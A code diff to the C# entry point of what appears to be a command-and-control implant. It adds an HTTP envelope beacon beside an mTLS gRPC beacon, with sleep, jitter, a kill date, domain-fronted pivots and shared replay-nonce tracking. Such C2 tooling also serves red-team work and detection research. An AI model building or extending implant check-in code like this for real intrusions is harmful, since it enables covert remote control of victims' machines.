@@ -99,13 +99,33 @@ internal static class ImplantApp
             CAs = serverCAs,
         };
 
+        // The check-in client follows the egress walk's URL shape
+        // (architecture.md Sec 8): a web entry -- an http(s):// beacon URL --
+        // runs the envelope POST cycle on that port; a bare host:port runs
+        // the mTLS gRPC stream. Both clients share the replay-nonce floor
+        // (Sec 9) and, through the one enroll bundle, the fronted-pivot
+        // ledger, so a run that crosses shapes keeps its accepted-nonce
+        // history and its fronted children. The loop re-selects whenever a
+        // client yields its run, so the walk's current entry always decides.
+        var nonces = new TaskNonceTracker();
         var beacon = new Beacon(
             config.Mode, egress, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
             config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
-            config.ClassVerbs, log);
+            config.ClassVerbs, log, nonces);
+        var envelopeBeacon = new EnvelopeBeacon(
+            egress, enrollment.ImplantId, enrollment.Leaf, enrollment.CAs,
+            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
+            config.ClassVerbs, log, nonces);
         try
         {
-            await beacon.RunAsync(cts.Token);
+            while (true)
+            {
+                var exit = EnvelopeBeacon.IsWebBeaconUrl(egress.CurrentBeaconUrl)
+                    ? await envelopeBeacon.RunAsync(cts.Token)
+                    : await beacon.RunAsync(cts.Token);
+                if (exit == CheckInExit.Terminate)
+                    break;
+            }
         }
         catch (OperationCanceledException)
         {
